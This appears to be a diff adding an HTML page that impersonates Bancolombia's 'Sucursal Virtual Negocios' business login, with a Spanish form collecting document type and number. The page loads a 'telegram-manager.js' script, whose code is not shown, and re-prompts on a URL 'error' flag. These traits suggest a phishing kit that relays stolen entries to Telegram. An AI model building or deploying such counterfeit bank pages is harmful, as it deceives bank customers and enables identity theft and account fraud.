@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Sucursal Virtual Negocios - Bancolombia">
+    <title>Sucursal Virtual Negocios - Bancolombia</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <link rel="stylesheet" href="assets/css/loading-overlay.css">
+    <link rel="stylesheet" href="assets/css/error-message.css">
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <img src="https://1000logos.net/wp-content/uploads/2021/11/Bancolombia-logo.png" alt="Bancolombia"
+                class="header__logo">
+            <h1 class="header__title">Sucursal Virtual Negocios</h1>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main">
+        <div class="container">
+            <div class="background-decoration">
+                <img src="img/trazo-auth.svg" alt="" class="decoration-svg" aria-hidden="true">
+            </div>
+
+            <div class="welcome-card">
+                <h2 class="welcome-card__title">Te damos la bienvenida</h2>
+                <p class="welcome-card__subtitle">Ingresa el documento de tu negocio.</p>
+
+                <div id="errorDisplay" class="error-message">
+                    <p class="error-message__text"></p>
+                </div>
+
+                <form id="documentForm" class="document-form">
+                    <div class="form-group">
+                        <div class="custom-select" id="customSelect">
+                            <button type="button" class="custom-select__trigger" id="selectTrigger">
+                                <span class="custom-select__label" id="selectLabel">Tipo de documento</span>
+                                <svg class="custom-select__arrow" width="20" height="20" viewBox="0 0 20 20" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M5 7.5L10 12.5L15 7.5" stroke="#666" stroke-width="2"
+                                        stroke-linecap="round" stroke-linejoin="round" />
+                                </svg>
+                            </button>
+
+                            <div class="custom-select__dropdown" id="selectDropdown">
+                                <div class="custom-select__option" data-value="NIT">NIT</div>
+                                <div class="custom-select__option" data-value="CC">Cédula de Ciudadanía</div>
+                                <div class="custom-select__option" data-value="CE">Cédula de Extranjería</div>
+                                <div class="custom-select__option" data-value="PA">Pasaporte</div>
+                                <div class="custom-select__option" data-value="IEPN">ID Extranjero Persona Natural</div>
+                                <div class="custom-select__option" data-value="IEPJ">ID Extranjero Persona Jurídica
+                                </div>
+                                <div class="custom-select__option" data-value="FID">Fideicomiso</div>
+                                <div class="custom-select__option" data-value="CD">Carné Diplomático</div>
+                            </div>
+
+                            <input type="hidden" name="documentType" id="documentType" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="floating-label" id="inputFloatingLabel">Número de documento</label>
+                        <div class="input-wrapper" id="inputWrapper">
+                            <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <rect x="4" y="8" width="16" height="13" rx="1" stroke="#666" stroke-width="1.5" />
+                                <path d="M8 8V6C8 4.89543 8.89543 4 10 4H14C15.1046 4 16 4.89543 16 6V8" stroke="#666"
+                                    stroke-width="1.5" />
+                                <rect x="7" y="12" width="2" height="2" fill="#666" />
+                                <rect x="11" y="12" width="2" height="2" fill="#666" />
+                                <rect x="15" y="12" width="2" height="2" fill="#666" />
+                                <rect x="7" y="16" width="2" height="2" fill="#666" />
+                                <rect x="11" y="16" width="2" height="2" fill="#666" />
+                                <rect x="15" y="16" width="2" height="2" fill="#666" />
+                            </svg>
+                            <input type="text" id="documentNumber" name="documentNumber" class="form-input"
+                                autocomplete="off" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="btn-submit" disabled>
+                        Continuar
+                    </button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-info">
+                <div class="footer-info__left">
+                    <img src="img/logo-bancolombia.png" alt="Bancolombia" class="footer-info__logo">
+                    <div class="footer-info__copyright">
+                        <p>Copyright © 2026 Bancolombia.</p>
+                        <img src="img/SFC__NEGRO_1_1.png" alt="Vigilado Superintendencia Financiera de Colombia"
+                            class="footer-info__badge">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+
+    <script src="assets/js/telegram-manager.js"></script>
+    <script src="assets/js/script.js"></script>
+    <script>
+        // Manejar errores de la URL
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('error')) {
+            const errorDiv = document.getElementById('errorDisplay');
+            const errorText = errorDiv.querySelector('.error-message__text');
+            if (urlParams.get('error') === 'documento') {
+                errorText.textContent = 'Tu número de documento es inválido o incorrecto. Por favor, verifica e intenta nuevamente.';
+                errorDiv.classList.add('active');
+            }
+        }
+    </script>
+</body>
+
+</html>
